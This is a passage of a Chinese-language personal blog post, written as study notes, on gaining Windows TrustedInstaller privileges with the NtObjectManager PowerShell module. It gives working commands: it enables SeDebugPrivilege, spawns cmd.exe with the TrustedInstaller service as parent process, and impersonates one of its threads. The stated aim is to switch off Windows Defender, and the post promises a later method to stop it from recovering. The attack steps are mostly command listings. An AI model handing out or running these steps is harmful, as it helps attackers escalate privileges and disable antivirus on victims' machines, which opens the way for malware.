Unrestricted</p><p>回车执行命令，系统会显示执行策略更改，输入 A 并回车确认</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824700.png" srcset="/img/loading.gif" lazyload alt="image-20220228212931388"></p><p>接着，导入 NtObjectManager 模块，输入并回车执行以下命令：</p><p>Import-Module NtObjectManager</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824507.png" srcset="/img/loading.gif" lazyload alt="image-20220228212958601"></p><p><strong>好的 准备工作结束 正式开始利用</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sc.exe <span class="hljs-built_in">start</span> TrustedInstaller<br><br><br><br><span class="hljs-built_in">Set-NtTokenPrivilege</span> SeDebugPrivilege<br><br><br><br><span class="hljs-built_in">Start-Service</span> TrustedInstaller<br><br><span class="hljs-variable">$p</span> = <span class="hljs-built_in">Get-Ntprocess</span> <span class="hljs-literal">-Name</span> TrustedInstaller.exe<br><br><span class="hljs-variable">$t</span> = <span class="hljs-variable">$p</span>.OpenToken()<br><br><span class="hljs-variable">$t</span>.Groups | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.Sid.Name <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;TrustedInstaller&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824495.png" srcset="/img/loading.gif" lazyload alt="image-20220228213138297"></p><p>whoami &#x2F;groups &#x2F;fo list试一下</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824979.png" srcset="/img/loading.gif" lazyload alt="image-20220228213208546"></p><p>可以看到我们已经获得 Trustedinstaller 权限了，现在就可以通过一些命令修改系统文件了。如果想要更加方便操作，可以通过此 CMD 运行 taskmgr、notepad 等应用，在运行新任务、打开文件的浏览窗口下，进行文件编辑。编辑结束后直接关闭即可。</p><p>　　注意!不要使用 CMD 运行 explorer，因为 explorer 无法在当前用户下正常使用。在这之后如果，想要重新获得 Trustedinstaller 权限重新执行以下命令即可：</p><p>　</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">　sc.exe <span class="hljs-built_in">start</span> TrustedInstaller<span class="hljs-built_in">Set-NtTokenPrivilege</span> SeDebugPrivilege<span class="hljs-variable">$p</span> = <span class="hljs-built_in">Get-NtProcess</span> <span class="hljs-literal">-Name</span> TrustedInstaller.exe<span class="hljs-variable">$proc</span> = <span class="hljs-built_in">New-Win32Process</span> cmd.exe <span class="hljs-literal">-CreationFlags</span> NewConsole <span class="hljs-literal">-ParentProcess</span> <span class="hljs-variable">$p</span><br></code></pre></td></tr></table></figure><p><strong>这很简单，是时候来尝试一下TI的其他操作了。</strong></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228210725027.png" srcset="/img/loading.gif" lazyload alt="image-20220228210725027"></p><p>好吧，看起来我们没法通过使用这个token创建或者模拟一个进程，这可不太好。在上图底部我们可以看到原因。我们只有TOKEN_QUERY的权限，但是我们至少需要TOKEN_DUPLICATE权限来获取一个创建新进程所需要的token。检查token的安全描述，使用Process Hacker来查看为什么我们的访问权限这么低（我们甚至连READ_CONTROL权限都没有）。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824089.png" srcset="/img/loading.gif" lazyload alt="image-20220228210735367"></p><p>可以看到，管理员组只有TOKEN_QUERY权限。这一点与我们通过token获得的访问权限是一致的。你可能想知道为什么SeDebugPrivilege没有生效，因为调试权限仅仅绕过了进程和线程对象的安全检查，它并不会对token进行任何操作，因为我们没法获得它的帮助。看起来有点麻烦，但是是否就没有除了修改服务二进制这种暴力操作以外的其他方法来达到目的了呢？</p><p>当然不是了。有一些例子可以说明我们如何让类似于TI的服务运行起来，一般来说，可以先安装一个服务来运行代码，然后窃取TI令牌，最后再创建新进程。很容易理解，如果我想创建一个服务，我只需要修改Trusted Installer服务。</p><p>因此，有两种很简单的方法来绕过这种权限限制，并且不需要任何新的或者修改过的或者注入过代码的服务。我们首先来看创建新进程的问题。一个进程的父进程会调用CreateProcess，对于UAC来说，这将提升子进程的权限，这看起来有些奇怪。为了支持微软所介绍的Vista中的最小权限原则，通过创建新进程时都会显式指定一个父进程，以便权限提升后的进程仍然是调用者的子进程。</p><p>通常在开启了UAC的情况下，你可以显示指定子新进程的token。然而，如果你没有指定token，新进程就会从父进程处继承token。因此，我们这么做的唯一要求是获得父进程句柄的PROCESS_CREATE_PROCESS权限。由于我们已经有SeDebugPrivilege权限了，我们就可以获取TI进程的完整权限，当然也包括创建它的子进程的权限。这么做的额外好处是，内核中创建进程的代码甚至会直接为调用者分配正确的会话ID，这样就可以创建交互式进程了。我们利用这种特性，在当前桌面上通过New-Win32Process使用TI服务的token创建了任意进程，并且通过-ParentProcess参数将进程对象传递进去。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824475.png" srcset="/img/loading.gif" lazyload alt="image-20220228210747258"></p><p>在不创建新进程的情况下模拟token也很有用。有没有方法实现呢？有。我们可以使用NtImpersonateThread API，它允许从现有的线程中捕获上下文，并且可以应用到另一条线程中。模拟上下文工作的过程是，内核首先尝试捕获该线程的token，如果线程没有token，那么内核将通过模拟来复制与线程相关进程的token。而NtImpersonateThread API的美妙之处在于，设置父进程时不需要访问token的权限，它只需要THREAD_DIRECT_IMPERSONATION模拟访问一个线程，这一点我们只需要使用SeDebugPrivilege就可以做到。因此，可以通过以下步骤来获得一个不产生新进程的模拟线程：</p><p><strong>以至少PROCESS_QUERY_INFORMATION的权限打开一个进程，枚举其线程</strong></p><p><strong>以THREAD_DIRECT_IMPERSONATION权限打开进程中的第一条线程</strong></p><p><strong>调用NtImpersonate Thread来获取一个模拟token</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sc.exe <span class="hljs-built_in">start</span> TrustedInstaller<br><br><span class="hljs-variable">$p</span> = <span class="hljs-built_in">Get-NtProcess</span> <span class="hljs-literal">-Name</span> TrustedInstaller.exe<br><br><span class="hljs-variable">$th</span> = <span class="hljs-variable">$p</span>.GetFirstThread()<br><br><span class="hljs-variable">$current</span> = <span class="hljs-built_in">Get-NtThread</span> <span class="hljs-literal">-Current</span> <span class="hljs-literal">-PseudoHandle</span><br><br><span class="hljs-variable">$imp</span> = <span class="hljs-variable">$current</span>.ImpersonateThread(<span class="hljs-variable">$th</span>)<br><br><span class="hljs-variable">$imp_token</span> = <span class="hljs-built_in">Get-NtToken</span> <span class="hljs-literal">-Impersonation</span><br><br><span class="hljs-variable">$imp_token</span>.Groups | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.Sid.Name <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;TrustedInstaller&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824896.png" srcset="/img/loading.gif" lazyload alt="image-20220228214339561"></p><p>现在，只要其他线程不去设置主线程的模拟token（并且你也不要在分离出的线程上做任何事情），那么你的PowerShell控制台就是拥有TI组的状态。</p><p>$proc &#x3D; New-Win32Process cmd.exe -CreationFlags NewConsole -Token $t</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228214545675.png" srcset="/img/loading.gif" lazyload alt="image-20220228214545675"></p><p>直接运行 就很nice</p><p>$imp &#x3D; $t.Impersonate()</p><p>$t.GrantedAccess</p><p>试试关闭WDF</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824758.png" srcset="/img/loading.gif" lazyload alt="image-20220228214648480"></p><p>没有出现拒绝访问 就很nice！！！</p><p>怎么永久删除呢 后面讲解 使defende无法恢复呢</p></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/windows%E6%8F%90%E6%9D%83/" class="category-chain-item">windows提权</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">#学习笔记</a></div></div><div class="license-box my-3"><div class="license-title"><div>turated关掉windowsdefance</div><div>http://example.com/turated关掉windowsdefance.html</div></div><div class="license-meta"><div class="license-meta-item"><div>Author</div><div>CDxiaodong</div></div><div class="license-meta-item license-meta-date"><div>Posted on</div><div>April 9, 2022</div></div><div class="license-meta-item"><div>Licensed under</div><div><a target="_blank" href="https://creativecommons.org/licenses/by/4.0/"><span class="hint--top hint--rounded" aria-label="BY - Attribution"><i class="iconfont icon-by"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8.html" title="java代码审计入门"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">java代码审计入门</span> <span class="visible-mobile">Previous</span></a></article><article class="post-next col-6"><a href="/%E6%89%8B%E6%8A%84linux%E5%90%84%E6%96%87%E4%BB%B6%E5%A4%B9%E8%AF%B4%E6%98%8E.html" title="手抄linux各文件夹及文件说明"><span class="hidden-mobile">手抄linux各文件夹及文件说明</span> <span class="visible-mobile">Next</span> <i class="iconfont icon-arrowright"></i></a></article></div></div></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>Table of Contents</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">Search</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">Keyword</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://github.com/cdxiaodong" target="_blank" rel="nofollow noopener"><span>CD</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/cdxiaodong" target="_blank" rel="nofollow noopener"><span>XD</span></a></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">Views: <span id="busuanzi_value_site_pv"></span> </span><span id="busuanzi_container_site_uv" style="display:none">Visitors: <span id="busuanzi_value_site_uv"></span></span></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",function(){NProgress.done()})</script><script src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t){var e=Fluid.plugins.typing,i=t.getElementById("subtitle");i&&e&&e(i.getAttribute("data-typed-text"))}((window,document))</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js",function(){var t,o=jQuery("#toc");0!==o.length&&window.tocbot&&(t=jQuery("#board-ctn").offset().top,window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-t},CONFIG.toc)),0<o.find(".toc-list-item").length&&o.css("visibility","visible"),Fluid.events.registerRefreshCallback(function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;0<t.find(".toc-list-item").length&&t.css("visibility","visible")}}))})</script><script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",function(){Fluid.plugins.fancyBox()})</script><script>Fluid.plugins.imageCaption()</script><script defer src="/js/leancloud.js"></script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">Blog works best with JavaScript enabled</div></noscript></body></html>